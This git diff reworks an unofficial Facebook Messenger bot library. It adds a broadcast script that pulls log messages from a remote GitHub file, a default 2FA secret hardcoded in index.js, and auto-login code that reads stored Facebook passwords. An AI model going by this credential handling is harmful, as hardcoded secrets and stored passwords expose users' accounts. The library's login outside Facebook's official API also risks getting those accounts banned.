+                "Missing": "Please Code 2Fa According to the Photo's Guide in PriyanshFca.json Series AuthString!",
+                "EnterSecurityCode": "Enter your 2-Factor Authentication Code: ",
+                "ErrThroughCookies": "2Fa Piercing Error Occurred, Enter Code 2Fa Again! ",
+
+                "WishMessage": [
+                    "Have a Nice Day !",
+                    "Hello how are you !",
+                    "Thank You For Using Priyansh's FCA !"
+                ]
+            },
+            "ExtraGetThread": {
+                "CreateDatabaseSuccess": "Successfully Initiate Database for Group: %1",
+                "CreateDatabaseFailure": "Initialization of Group Database Failure: %1",
+                "alreadyUpdate": "%1 Ready to Update Database",
+                "updateDataSuccess": "Data Update for Group %1 Success!",
+                "updateDataFailure": "Data Update for Group %1 Failed!"
+            },
+            "ExtraUpTime": {
+                "Uptime": "Connecting To Server Uptime Succeeds!",
+                "PM2": "Trying to PM2 Mode!",
+                "InPm2Mode": "You Are In Uptime PM2 Mode !",
+                "NotSupport": "Your Operating System does not currently support Uptime Server !",
+                "Maintenance": "Server Uptime In Maintenance, Try Again Later!"
+            },
+            "Src": {
+                "AutoRestart": "Automatically Restart After: %1 Minutes !",
+                "OnRestart": "Restarting..."
+            }
+        }
+    }
+]
diff --git a/README.md b/README.md
index 4e6192f08..df5227cb6 100644
--- a/README.md
+++ b/README.md
@@ -1,215 +1 @@
-LÆ°u Ã! ÄÃ¢y LÃ  Sáº£n Pháº©m ÄÆ°á»£c Horizon Remake ( ChÃ­nh Bá»Ÿi Facebook-Chat-Api Cá»§a Schmavery, TÃ¡c Giáº£ KhÃ´ng Chá»‹u TrÃ¡ch Nghiá»‡m NÃ o !), Náº¿u CÃ³ Lá»—i HÃ£y Thá»­ Sá»­ Dá»¥ng Sang Sáº£n Pháº©m KhÃ¡c !
-
-## Support For : 
-+ Horizon Lucius Synthesis IV
-+ MiraiPr0ject
-+ C3C
-+ Kb2a
-+ LawerBot
-+ Lazic (Private)
-+ Goat
-+ Jabd
-+ Sumi
-
-
-# Api Cho ChatBot Messenger
-
-Facebook Giá» ÄÃ£ CÃ³ Api Cho ChatBot ðŸ˜ª Táº¡i Äey => [ÄÃ¢y NÃ¨](https://developers.facebook.com/docs/messenger-platform).
-
-Api NÃ y CÃ³ Thá»ƒ Khiáº¿n Cho Báº¡n Payy Acc NhÆ° CÃ¡ch Acc Báº¡n ChÆ°a Tá»«ng CÃ³, HÃ£y ChÃº Ã NhÃ© =))
-
-LÆ°u Ã ! Náº¿u Báº¡n Muá»‘n SÃ i Api NÃ y HÃ£y Xem Document Táº¡i [ÄÃ¢y NÃ¨](https://github.com/Schmavery/facebook-chat-api).
-
-## Táº£i Vá» 
-Náº¿u Báº¡n Muá»‘n Sá»­ Dá»¥ng, HÃ£y Táº£i NÃ³ Báº±ng CÃ¡ch:
-```bash
-npm i fca-horizon-remake
-```
-or
-```bash
-npm install fca-horizon-remake
-```
-
-NÃ³ Sáº½ Táº£i VÃ´ node_modules (Lib Cá»§a Báº¡n)
-
-### Táº£i Báº£n Má»›i Nháº¥t Hoáº·c Update
-    Náº¿u Báº¡n Muá»‘n Sá»­ Dá»¥ng PhiÃªn Báº£n Má»›i Nháº¥t Hay Cáº­p Nháº­t ThÃ¬ HÃ£y VÃ´ Terminal Hoáº·c Command Promt Nháº­p :
-    ```bash
-    npm install fca-horizon-remake@latest
-```
-Hoáº·c
-```bash
-npm i fca-horizon-remake@latest
-```
-
-## Náº¿u Báº¡n Muá»‘n Test Api 
-Lá»£i Ãch Cho Viá»‡c NÃ y ThÃ¬ Báº¡n Sáº½ KhÃ´ng Tá»‘n Thá»i Gian Pay Acc VÃ  CÃ³ Acc ðŸ˜ª
-HÃ£y Sá»­ Dá»¥ng Vá»›i TÃ i Khoáº£n Thá»­ Nghiá»‡m => [Facebook Whitehat Accounts](https://www.facebook.com/whitehat/accounts/).
-
-## CÃ¡ch Sá»­ Dá»¥ng
-```javascript
-const login = require("fca-horizon-remake"); // láº¥y tá»« lib ra 
-
-// Ä‘Äƒng nháº­p
-login({email: "Gmail Account", password: "Máº­t Kháº©u Facebook Cá»§a Báº¡n"}, (err, api) => {
-
-    if(err) return console.error(err); // trÆ°á»ng há»£p lá»—i
-
-    // táº¡o bot tá»± Ä‘á»™ng nhÃ¡i theo báº¡n:
-    api.listen((err, message) => {
-        api.sendMessage(message.body, message.threadID);
-    });
-
-});
-```
-
-Káº¿t Quáº£ LÃ  NÃ³ Sáº½ NhÃ¡i Báº¡n NhÆ° HÃ¬nh DÆ°á»›i:
-<img width="517" alt="screen shot 2016-11-04 at 14 36 00" src="https://cloud.githubusercontent.com/assets/4534692/20023545/f8c24130-a29d-11e6-9ef7-47568bdbc1f2.png">
-
-Náº¿u Báº¡n Muá»‘n Sá»­ Dá»¥ng NÃ¢ng Cao ThÃ¬ HÃ£y Sá»­ Dá»¥ng CÃ¡c Loáº¡i Bot ÄÆ°á»£c Liá»‡t KÃª á»ž TrÃªn !
-
-
-## Danh SÃ¡ch
-
-Báº¡n CÃ³ Thá»ƒ Äá»c Full Api Táº¡i => [here](DOCS.md).
-
-## Main Functionality
-
-### Sending a message
-#### api.sendMessage(message, threadID[, calblack][, messageID])
-
-Various types of message can be sent:
-* *Regular:* set field `body` to the desired message as a string.
-* *Sticker:* set a field `sticker` to the desired sticker ID.
-* *File or image:* Set field `attachment` to a readable stream or an array of readable streams.
-* *URL:* set a field `url` to the desired URL.
-* *Emoji:* set field `emoji` to the desired emoji as a string and set field `emojiSize` with size of the emoji (`small`, `medium`, `large`)
-
-Note that a message can only be a regular message (which can be empty) and optionally one of the following: a sticker, an attachment or a url.
-
-__Tip__: to find your own ID, you can look inside the cookies. The `userID` is under the name `c_user`.
-
-__Example (Basic Message)__
-```js
-const login = require("fca-horizon-remake");
-
-login({email: "FB_EMAIL", password: "FB_PASSWORD"}, (err, api) => {
-    if(err) return console.error(err);
-
-    var yourID = "000000000000000"; // id facebook cá»§a báº¡n
-    var msg = "Hey!";
-    api.sendMessage(msg, yourID);
-});
-```
-
-__Example (CÃ¡ch Upload File Qua Tin Nháº¯n)__
-```js
-const login = require("fca-horizon-remake");
-
-login({email: "FB_EMAIL", password: "FB_PASSWORD"}, (err, api) => {
-    if(err) return console.error(err);
-
-    // Note this example uploads an image called image.jpg
-    var yourID = "000000000000000";
-    var msg = {
-        body: "Hey!",
-        attachment: fs.createReadStream(__dirname + '/image.jpg')
-    }
-    api.sendMessage(msg, yourID);
-});
-```
-
-------------------------------------
-### LÆ°u Láº¡i ThÃ´ng Tin ÄÄƒng Nháº­p.
-
-Äá»ƒ LÆ°u Láº¡i ThÃ¬ Báº¡n Cáº§n 1 Apstate Kiá»ƒu (Cookie, etc,..) Äá»ƒ LÆ°u Láº¡i Hoáº·c LÃ  Sá»­ Dá»¥ng MÃ£ Login NhÆ° TrÃªn Äá»ƒ ÄÄƒng Nháº­p !
-__HÆ°á»›ng Dáº«n Vá»›i Appstate__
-
-```js
-const fs = require("fs");
-const login = require("fca-horizon-remake");
-
-var credentials = {email: "FB_EMAIL", password: "FB_PASSWORD"}; // thÃ´ng tin tk
-
-login(credentials, (err, api) => {
-    if(err) return console.error(err);
-    // Ä‘Äƒng nháº­p
-    fs.writeFileSync('appstate.json', JSON.stringify(api.getAppState())); //táº¡o appstate
-});
-```
-
-Hoáº·c Dá»… DÃ ng HÆ¡n ( ChuyÃªn Nghiá»‡p ) Báº¡n CÃ³ Thá»ƒ DÃ¹ng => [c3c-fbstate](https://github.com/c3cbot/c3c-fbstate) Äá»ƒ Láº¥y Fbstate And Rename Láº¡i ThÃ nh Apstate CÅ©ng ÄÆ°á»£c ! (appstate.json)
-
-------------------------------------
-
-### Listening to a chat
-#### api.listen(callback)
-
-Listen watches for messages sent in a chat. By default this won't receive events (joining/leaving a chat, title change etcâ€¦) but it can be activated with `api.setOptions({listenEvents: true})`. This will by default ignore messages sent by the current account, you can enable listening to your own messages with `api.setOptions({selfListen: true})`.
-
-__Example__
-
-```js
-const fs = require("fs");
-const login = require("fca-horizon-remake");
-
-// Simple echo bot. It will repeat everything that you say.
-// Will stop when you say '/stop'
-login({appState: JSON.parse(fs.readFileSync('appstate.json', 'utf8'))}, (err, api) => {
-    if(err) return console.error(err);
-
-    api.setOptions({listenEvents: true});
-
-    var stopListening = api.listenMqtt((err, event) => {
-        if(err) return console.error(err);
-
-        api.markAsRead(event.threadID, (err) => {
-            if(err) console.error(err);
-        });
-
-        switch(event.type) {
-            case "message":
-                if(event.body === '/stop') {
-                    api.sendMessage("Goodbyeâ€¦", event.threadID);
-                    return stopListening();
-                }
-                api.sendMessage("TEST BOT: " + event.body, event.threadID);
-                break;
-            case "event":
-                console.log(event);
-                break;
-        }
-    });
-});
-```
-
-## FAQS
-
-1. How do I run tests?
-> For tests, create a `test-config.json` file that resembles `example-config.json` and put it in the `test` directory. From the root >directory, run `npm test`.
-
-2. Why doesn't `sendMessage` always work when I'm logged in as a page?
-> Pages can't start conversations with users directly; this is to prevent pages from spamming users.
-
-3. What do I do when `login` doesn't work?
-> First check that you can login to Facebook using the website. If login approvals are enabled, you might be logging in incorrectly. For how to handle login approvals, read our docs on [`login`](DOCS.md#login).
-
-4. How can I avoid logging in every time?  Can I log into a previous session?
-> We support caching everything relevant for you to bypass login. `api.getAppState()` returns an object that you can save and pass into login as `{appState: mySavedAppState}` instead of the credentials object.  If this fails, your session has expired.
-
-5. Do you support sending messages as a page?
-> Yes, set the pageID option on login (this doesn't work if you set it using api.setOptions, it affects the login process).
-> ```js
-> login(credentials, {pageID: "000000000000000"}, (err, api) => { â€¦ }
-> ```
-
-6. I'm getting some crazy weird syntax error like `SyntaxError: Unexpected token [`!!!
-> Please try to update your version of node.js before submitting an issue of this nature.  We like to use new language features.
-
-7. I don't want all of these logging messages!
-> You can use `api.setOptions` to silence the logging. You get the `api` object from `login` (see example above). Do
-> ```js
-> api.setOptions({
->     logLevel: "silent"
-> });
-> ```
+# try
\ No newline at end of file
diff --git a/SECURITY.md b/SECURITY.md
index 41b89d834..9a6157abd 100644
--- a/SECURITY.md
+++ b/SECURITY.md
@@ -1 +1,17 @@
-Please follow the instructions on [Tidelift's security page](https://tidelift.com/docs/security) to report a security issue.
+# Security Policy
+
++ if have any Vulnerability finded contact: Author(Priyansh) or (Facebook.com/Priyanshu.Rajput.Official). Thanks!
+
+## Supported Versions
+
+Use this section to tell people about which versions of your project are
+currently being supported with security updates.
+
+| Version | Supported          |
+| ------- | ------------------ |
+| Main Version With Autoupdate | :white_check_mark: |
+| Old Version | :x:|
+
+## Reporting a Vulnerability
+
+Contact Author
diff --git a/broadcast.js b/broadcast.js
new file mode 100644
index 000000000..51335d9a1
--- /dev/null
+++ b/broadcast.js
@@ -0,0 +1,38 @@
+switch (global.Fca.Require.Priyansh.BroadCast) {
+    case true: {
+        try {
+            var logger = global.Fca.Require.logger;
+                var Fetch = global.Fca.Require.Fetch;
+                    Fetch.get("https://raw.githubusercontent.com/priyanshu192/fb-bot/main/Fca_BroadCast.json").then(async (/** @type {{ body: { toString: () => string; }; }} */ res) => {
+                        global.Fca.Data.BroadCast = JSON.parse(res.body.toString())
+                    var random = JSON.parse(res.body.toString())[Math.floor(Math.random() * JSON.parse(res.body.toString()).length)] || "Priyansh !";
+                logger.Normal(random);
+            }); 
+        }	
+        catch (e) {
+            console.log(e);
+        }
+        return setInterval(() => { 
+            try {
+                try {
+                    var logger = global.Fca.Require.logger;
+                        var random = global.Fca.Data.BroadCast[Math.floor(Math.random() * global.Fca.Data.BroadCast.length)] || "Priyansh !";
+                    logger.Normal(random);
+                }	
+                catch (e) {
+                    console.log(e);
+                    return;
+                }
+            }
+            catch (e) {
+                console.log(e);
+            }
+        },1800 * 1000);
+    }
+    case false: {
+        break;
+    }
+    default: {
+        break;
+    }
+}
diff --git a/gitattributes b/gitattributes
new file mode 100644
index 000000000..dfe077042
--- /dev/null
+++ b/gitattributes
@@ -0,0 +1,2 @@
+# Auto detect text files and perform LF normalization
+* text=auto
diff --git a/gitignore.txt b/gitignore.txt
new file mode 100644
index 000000000..7d6e21d30
--- /dev/null
+++ b/gitignore.txt
@@ -0,0 +1,10 @@
+
+.vscode/settings.json
+CountTime.json
+Extra/Database/SyntheticDatabase.sqlite
+CountTime.json
+CountTime.json
+package-lock.json
+yarn.lock
+CountTime.json
+package-lock.json
diff --git a/index.js b/index.js
index 532e1c55e..8681cc9b4 100644
--- a/index.js
+++ b/index.js
@@ -1,96 +1,857 @@
-"use strict";
+'use strict';
 
-var utils = require("./utils");
-var cheerio = require("cheerio");
-var log = require("npmlog");
+/**
+    * Developers: @KanzuWakazaki - @HarryWakazaki
+    ** A few words about developer appstate security.
+    *! Statement renouncing responsibility for the security of appstate encryption of the following operating systems: windows, Android, Linux operating systems,.. (maybe repl.it?),
+    *! because the above operating systems are private (except rep.it if the fraudster does not own your account or invite link to join).
+    *! If the intruder owns the computer, these private operating systems,the security of this fca cannot guarantee 100% of the time.
+    ** If the grammar is wrong, please understand because I'm just a kid ðŸµ.
+*/
 
+/!-[ Global Set ]-!/
+
+global.Fca = new Object({
+    isThread: new Array(),
+    isUser: new Array(),
+    startTime: Date.now(),
+    Setting: new Map(),
+    Version: require('./package.json').version,
+    Require: new Object({
+        fs: require("fs"),
+        Fetch: require('got'),
+        log: require("npmlog"),
+        utils: require("./utils"),
+        logger: require('./logger'),
+        languageFile: require('./Language/index.json'),
+        Database: require("./Extra/Database"),
+        Security: require('./Extra/Src/uuid')
+    }),
+    getText: function(/** @type {any[]} */...Data) {
+        var Main = (Data.splice(0,1)).toString();
+            for (let i = 0; i < Data.length; i++) Main = Main.replace(RegExp(`%${i + 1}`, 'g'), Data[i]);
+        return Main;
+    },
+    Data: new Object({
+        ObjPriyansh: {
+            "Language": "en",
+            "PreKey": "",
+            "AutoUpdate": true,
+            "MainColor": "#9900FF",
+            "MainName": "[ FCA-PRIYANSH ]",
+            "Logo": true,
+            "Uptime": true,
+            "Config": "default",
+            "Login2Fa": false,
+            "AutoLogin": false,
+            "BroadCast": true,
+            "AuthString": "SD4S XQ32 O2JA WXB3 FUX2 OPJ7 Q7JZ 4R6Z",
+            "EncryptFeature": true,
+            "ResetDataLogin": false,
+            "AutoRestartMinutes": 0,
+            "HTML": {   
+                "HTML": true,
+                "UserName": "Guest"
+            }   
+        },
+        CountTime: function() {
+            var fs = global.Fca.Require.fs;
+            if (fs.existsSync(__dirname + '/CountTime.json')) {
+                try {
+                    var data = Number(fs.readFileSync(__dirname + '/CountTime.json', 'utf8')),
+                    hours = Math.floor(data / (60 * 60));
+                }
+                catch (e) {
+                    fs.writeFileSync(__dirname + '/CountTime.json', 0);
+                    hours = 0;
+                }
+            }
+            else {
+                hours = 0;
+            }
+            return `${hours} Hours`;
+        }
+    }),
+    AutoLogin: async function () {
+        var Database = global.Fca.Require.Database;
+        var logger = global.Fca.Require.logger;
+        var Email = (await global.Fca.Require.Database.get('Account')).replace(RegExp('"', 'g'), ''); //hmm IDK
+        var PassWord = (await global.Fca.Require.Database.get('Password')).replace(RegExp('"', 'g'), '');
+        login({ email: Email, password: PassWord},async (error, api) => {
+            if (error) {
+                logger.Error(JSON.stringify(error,null,2), function() { logger.Error("AutoLogin Failed!", function() { process.exit(0); }) });
+            }
+            try {
+                await Database.set("TempState", api.getAppState());
+            }
+            catch(e) {
+                logger.Warning(global.Fca.Require.Language.Index.ErrDatabase);
+                    logger.Error();
+                process.exit(0);
+            }
+            process.exit(1);
+        });
+    }
+});
+
+/!-[ Check File To Run Process ]-!/
+
+let Boolean_Fca = ["AutoUpdate","Uptime","BroadCast","EncryptFeature","AutoLogin","ResetDataLogin","Login2Fa","Logo"];
+let String_Fca = ["MainName","PreKey","Language","AuthString","Config"]
+let Number_Fca = ["AutoRestartMinutes"];
+let All_Variable = Boolean_Fca.concat(String_Fca,Number_Fca);
+
+try {
+    if (!global.Fca.Require.fs.existsSync(process.cwd() + '/PriyanshFca.json')) {
+        global.Fca.Require.fs.writeFileSync(process.cwd() + "/PriyanshFca.json", JSON.stringify(global.Fca.Data.ObjPriyansh, null, "\t"));
+        process.exit(1);
+    }
+
+try {
+    var DataLanguageSetting = require(process.cwd() + "/PriyanshFca.json");
+}
+catch (e) {
+    global.Fca.Require.logger.Error('Detect Your FastConfigFca Settings Invalid!, Carry out default restoration');
+    global.Fca.Require.fs.writeFileSync(process.cwd() + "/PriyanshFca.json", JSON.stringify(global.Fca.Data.ObjPriyansh, null, "\t"));     
+    process.exit(1)
+}
+    if (global.Fca.Require.fs.existsSync(process.cwd() + '/PriyanshFca.json')) {
+        try { 
+            if (DataLanguageSetting.Logo != undefined) {
+                    delete DataLanguageSetting.Logo
+                global.Fca.Require.fs.writeFileSync(process.cwd() + "/PriyanshFca.json", JSON.stringify(DataLanguageSetting, null, "\t"));        
+            }
+        }
+        catch (e) {
+            console.log(e);
+        }
+        if (!global.Fca.Require.languageFile.some((/** @type {{ Language: string; }} */i) => i.Language == DataLanguageSetting.Language)) { 
+            global.Fca.Require.logger.Warning("Not Support Language: " + DataLanguageSetting.Language + " Only 'en' and 'vi'");
+            process.exit(0); 
+        }
+        var Language = global.Fca.Require.languageFile.find((/** @type {{ Language: string; }} */i) => i.Language == DataLanguageSetting.Language).Folder.Index;
+        global.Fca.Require.Language = global.Fca.Require.languageFile.find((/** @type {{ Language: string; }} */i) => i.Language == DataLanguageSetting.Language).Folder;
+    } else process.exit(1);
+        for (let i in DataLanguageSetting) {
+            if (Boolean_Fca.includes(i)) {
+                if (global.Fca.Require.utils.getType(DataLanguageSetting[i]) != "Boolean") return logger.Error(i + " Is Not A Boolean, Need To Be true Or false !", function() { process.exit(0) });
+                else continue;
+            }
+            else if (String_Fca.includes(i)) {
+                if (global.Fca.Require.utils.getType(DataLanguageSetting[i]) != "String") return logger.Error(i + " Is Not A String, Need To Be String!", function() { process.exit(0) });
+                else continue;
+            }
+            else if (Number_Fca.includes(i)) {
+                if (global.Fca.Require.utils.getType(DataLanguageSetting[i]) != "Number") return logger.Error(i + " Is Not A Number, Need To Be Number !", function() { process.exit(0) });
+                else continue;
+            }
+        }
+        for (let i of All_Variable) {
+            if (!DataLanguageSetting[All_Variable[i]] == undefined) {
+                DataLanguageSetting[All_Variable[i]] = global.Fca.Data.ObjPriyansh[All_Variable[i]];
+                global.Fca.Require.fs.writeFileSync(process.cwd() + "/PriyanshFca.json", JSON.stringify(DataLanguageSetting, null, "\t"));
+            }
+            else continue; 
+        }
+    global.Fca.Require.Priyansh = DataLanguageSetting;
+}
+catch (e) {
+    console.log(e);
+    global.Fca.Require.logger.Error();
+}
+
+/!-[ Require config and use ]-!/
+
+if (global.Fca.Require.Priyansh.Config != 'default') {
+    //do ssth
+}
+
+/!-[ Require All Package Need Use ]-!/
+
+var utils = global.Fca.Require.utils,
+    logger = global.Fca.Require.logger,
+    fs = global.Fca.Require.fs,
+    getText = global.Fca.getText,
+    log = global.Fca.Require.log,
+    Fetch = global.Fca.Require.Fetch,
+    express = require("express")(),
+    { join, resolve } = require('path'),
+    cheerio = require("cheerio"),
+    StateCrypt = {},
+    { readFileSync } = require('fs-extra'),
+    Database = require("./Extra/Database"),
+    readline = require("readline"),
+    chalk = require("chalk"),
+    figlet = require("figlet"),
+    os = require("os"),
+    Security = require("./Extra/Security/Index");
+
+/!-[ Set Variable For Process ]-!/
+
+log.maxRecordSize = 100;
 var checkVerified = null;
+var Boolean_Option = ['online','selfListen','listenEvents','updatePresence','forceLogin','autoMarkDelivery','autoMarkRead','listenTyping','autoReconnect','emitReady'];
+
+/!-[ Set And Check Template HTML ]-!/
+
+var css = readFileSync(join(__dirname, 'Extra', 'Html', 'Classic', 'style.css'));
+var js = readFileSync(join(__dirname, 'Extra', 'Html', 'Classic', 'script.js'));
+
+/!-[ Function Generate HTML Template ]-!/
+
+/**
+ * It returns a string of HTML code.
+ * @param UserName - The username of the user
+ * @param Type - The type of user, either "Free" or "Premium"
+ * @param link - The link to the music you want to play
+ * @returns A HTML file
+ */
+
+function ClassicHTML(UserName,Type,link) {
+  return `<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Priyanshu Rajput Info</title>
+    <!--font awasome icons-->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" integrity="sha512-9usAa10IRO0HhonpyAIVpjrylPvoDwiPUiKdWk5t3PyolY1cOd4DSE0Ga+ri4AuTroPR5aQvXU9xC6qOPnzFeg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+    <!--my css file-->
+    <link rel="stylesheet" href="style.css">
+</head>
+<body >
+    <video autoplay muted plays-inline loop>
+        <source src="https://imgur.com/aoGxVLX.mp4" type="video/mp4">
+    </video>
+    <div class="container">
+        <button class="call"><i class="fa-solid fa-phone"></i></button>
+    <div class="card move">
+       <div class="imgbox">
+          <img src="https://i.imgur.com/eDbdlvd.jpg" alt="">
+       </div>
+       <div class="name-job">
+          <h3>Priyansh Rajput</h3>
+          <h5>Web Developer</h5>
+        </div>
+        <div class="skills">
+          <button class="btn-Follow"><a href="https://facebook.com/Priyanshu.Rajput.Official" target="_blank">Follow</a></button>
+          <button class="btn-Message"><a href=" https://telegram.me/Priyanshrajput" target="_blank">Message!</a></button>
+        </div>
+
+        </div>
+        <div class="icons">
+            <div class="icon">
+                <i class="fa-brands fa-twitter front"></i>
+                <i class="fa-brands fa-twitter back"></i>
+                <i class="fa-brands fa-twitter left"></i>
+                <i class="fa-brands fa-twitter right"></i>
+                <i class="fa-brands fa-twitter top"></i>
+                <i class="fa-brands fa-twitter bottom"></i>
+            </div>
+            <div class="icon">
+                <i class="fa-brands fa-youtube front"></i>
+                <i class="fa-brands fa-youtube back"></i>
+                <i class="fa-brands fa-youtube left"></i>
+                <i class="fa-brands fa-youtube right"></i>
+                <i class="fa-brands fa-youtube top"></i>
+                <i class="fa-brands fa-youtube bottom"></i>
+            </div>
+            <div class="icon">
+                <i class="fa-brands fa-facebook-f front"></i>
+                <i class="fa-brands fa-facebook-f back"></i>
+                <i class="fa-brands fa-facebook-f left"></i>
+                <i class="fa-brands fa-facebook-f right"></i>
+                <i class="fa-brands fa-facebook-f top"></i>
+                <i class="fa-brands fa-facebook-f bottom"></i>
+            </div>
+            <div class="icon">
+                <i class="fa-brands fa-whatsapp front"></i>
+                <i class="fa-brands fa-whatsapp back"></i>
+                <i class="fa-brands fa-whatsapp left"></i>
+                <i class="fa-brands fa-whatsapp right"></i>
+                <i class="fa-brands fa-whatsapp top"></i>
+                <i class="fa-brands fa-whatsapp bottom"></i>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
+<script>
+    var container=document.querySelector('.container')
+    var icons=document.querySelector('.icons')
+    var call=document.querySelector('.call')
+    var body =document.querySelector('body')
+    var card=document.querySelector('.card')
+    // body.addEventListener('onload',function(){
+        setTimeout(function(){
+        container.classList.add('move')
+    },3000)
+    // })
+   setTimeout(function(){
+    icons.style="opacity: 0"
+    call.style="opacity: 0"
+   },2000)
+   setTimeout(function(){
+    card.classList.remove('move')
+    icons.style="opacity: 1"
+    call.style="opacity: 1"
+   },6000)
+
+</script>
+
+<style>/* @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@100;200;300&display=swap'); */
+* {
+    padding: 0;
+    margin: 0;
+    box-sizing: border-box;
+    font-family: 'Roboto', sans-serif;
+}
+:root {
+    --width: 250px;
+    --height: 260px;
+    --i-width: calc(var(--height)*0.25 - 23px);
+}
+
+@media only screen and (min-width:64.1875em){
+    video{
+       height: 100%;
+       width: 100%;
+    }
+
+}
+@media only screen and (min-width:46.1875em) and (max-width:63.9375em){
+    video{
+        position: fixed;
+        top:0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background-color: #000;
+        height: 100%;
+        display: block;
+    }
+}
+@media only screen and (max-width:46.1875em){
+    video{
+        position: fixed;
+        top:0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background-color: #000;
+        height: 100%;
+        display: block;
+    }
+
+}
+body {
+    height: 100vh;
+    width: 100vw;
+    background-color: black;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    perspective: 600px;
+    overflow: hidden;
+}
+body::before {
+    content: '';
+    position: absolute;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 100%;
+    background: linear-gradient(#E91e63, #FF0);
+    clip-path: circle(22% at 30% 22%);
+    z-index: -1;
+}
+body::after {
+    content: '';
+    position: absolute;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 100%;
+    background: linear-gradient(#FFF, #DA00FF);
+    clip-path: circle(25% at 70% 80%);
+    z-index: -1;
+}
+.container {
+    position: fixed;
+    transform-style: preserve-3d;
+
+    display: none;
+
+    z-index: 99;
+
+
+}
+@keyframes move{
+    0%   {
+        transform: scale(0);
+        /* opacity: 0; */
+        border-radius: 50%;
+    }
+  25%  {
+    transform: scale(0.20);
+    /* opacity: 0.3; */
+    border-radius: 25%;
+}
+  50%  {
+    transform: scale(0.50);
+    /* opacity: 0,6; */
+}
+75%  {
+    transform: scale(0.75);
+    /* opacity: 0,6; */
+}
+  100% {
+    transform: scale(1);
+    /* opacity: 1; */
+}
+}
+.container.move{
+    animation: move linear 1.5s;
+    display: block;
+}
+.container::before{
+    content: "";
+    position: absolute;
+    top:-2px;
+    left: -2px;
+    width:calc(100% + 5px) ;
+    height: calc(100% + 5px);
+    border:3px solid linear-gradient(45deg,#e6fb04,#00ff66,#00ffff,#ff00ff
+    ,#ff0099,#6e0dde,#ff3300,#099fff);
+    /* background: linear-gradient(45deg,#e6fb04,#00ff66,#00ffff,#ff00ff
+    ,#ff0099,#6e0dde,#ff3300,#099fff); */
+    animation: animate 20s linear infinite;
+    background-size: 400%;
+    /* background:linear-gradient(transparent,#45f3ff,#45f3ff,#45f3ff,transparent); */
+    z-index: -1;
+
+}
+/* .container::after{
+    content: "";
+    position: absolute;
+
+    inset: 3px;
+} */
+@keyframes animate{
+    0%{
+        /* transform: translate(-50%,-50%) rotate(0deg); */
+
+        background-position: 0 0;
+    }
+    50%{
+        background-position:100% 0;
+    }
+    100%{
+        /* transform: translate(-50%,-50%) rotate(360deg); */
+        background-position: 0 0;
+    }
+}
+.card {
+    position: relative;
+    width: var(--width);
+    height: var(--height);
+    background-color: rgba(255, 255, 255, 0.02);
+    backdrop-filter: blur(9px);
+    border-top: 1px solid #FFF2;
+    border-left: 1px solid #FFF2;
+    box-shadow: 4px 4px 12px #0004;
+
+
+    color: #FFF;
+    overflow: hidden;
+    transition: transform 0.7s;
+    display: flex;
+    flex-wrap: wrap;
+    justify-content: center;
+    transition: 1s linear;
+}
+.card.move{
+    width: 120px;
+    height: 120px;
+    border-radius: 50%;
+    overflow: hidden;
+    padding: 0px;
+
+}
+.card.move .imgbox{
+    transform: translateY(0);
+}
+.card.move.card:before{
+    opacity: 0;
+}
+.card::before {
+    content: '';
+    position: absolute;
+    left: -99%;
+    width: 70px;
+    height: 400px;
+    background-color: #FFFB;
+    transform: rotate(38deg) translateY(-25%);
+    z-index: 1;
+}
+.container:hover .card:before {
+    animation: brightness 0.8s 1 forwards;
+}
+@keyframes brightness {
+    0% {
+        left: -99%;
+    }
+    100% {
+        left: 120%;
+    }
+}
+.imgbox {
+    width: 115px;
+    height: 115px;
+    border: 5px solid transparent;
+    box-shadow: 0px 0px 4px rgba(0, 0, 0, 0.533);
+    border-radius: 50%;
+    overflow: hidden;
+    text-align: center;
+    transition: 1s;
+    transform: translateY(10px);
+}
+.imgbox:hover{
+    width: 100%;
+    height: 100%;
+    border: none;
+    border-radius: unset;
+    transform: translateY(0px);
+}
+.imgbox:hover.card{
+    padding: 0;
+}
+.imgbox img {
+    width: 100%;
+    height: 100%;
+
+}
+.name-job {
+    width: 100%;
+    text-align: center;
+    text-shadow: 1px 2px 2px #000;
+    /* margin-bottom: 40px; */
+    margin-top: 10px
+}
+
+.name-job h3 {
+    margin-bottom: 0.1em;
+}
+.name-job h5 {
+    color: rgb(36, 219, 36);
+    line-height: 25px;
+}
+.info {
+    grid-column: 2 / 4;
+    grid-row: 1 / 3;
+    padding: 7px;
+    line-height: 1.8;
+    font-weight: 200;
+}
+.skills {
+    display: flex;
+    justify-content: space-around;
+    align-items: center;
+    margin-bottom: 6px;
+}
+.skills button{
+    padding: 5px 10px;
+    width: 85px;
+    margin: 5px;
+
+
+    cursor: pointer;
+}
+.btn-Follow a{
+    text-decoration: none;
+    color: black;
+}
+.btn-Follow{
+    background-color: rgb(36, 219, 36);
+    border-radius: 1px;
+    border: none;
+}
+.btn-Follow:hover{
+    background-color:  rgb(2, 250, 2);
+
+}
+.btn-Message a{
+    text-decoration: none;
+    color: rgb(36, 219, 36);
+}
+.btn-Message a:hover{
+    color: #000;
+}
+.btn-Message{
+    border: 1px solid rgb(36, 219, 36);
+    border-radius: 3px;
+    background-color: transparent;
+    color: #fff;
+}
+.btn-Message:hover{
+    background-color:  rgb(2, 250, 2);
+    color: red;
+}
+.skills .fa-brands {
+    cursor: pointer;
+    position: relative;
+    width: 45px;
+    height: 45px;
+    background-color: #FFF5;
+    box-shadow: 0px 2px 4px #0008, 0px -1px 1px #FFF;
+    display: grid;
+    place-content: center;
+    font-size: 1.22em;
+    border-radius: 50%;
+    transition: 0.3s;
+}
+.skills .fa-brands:hover {
+    background-color: #FFF;
+    color: #222;
+}
+.call {
+    cursor: pointer;
+    position: absolute;
+    left: 10px;
+    top: 10px;
+    width: 40px;
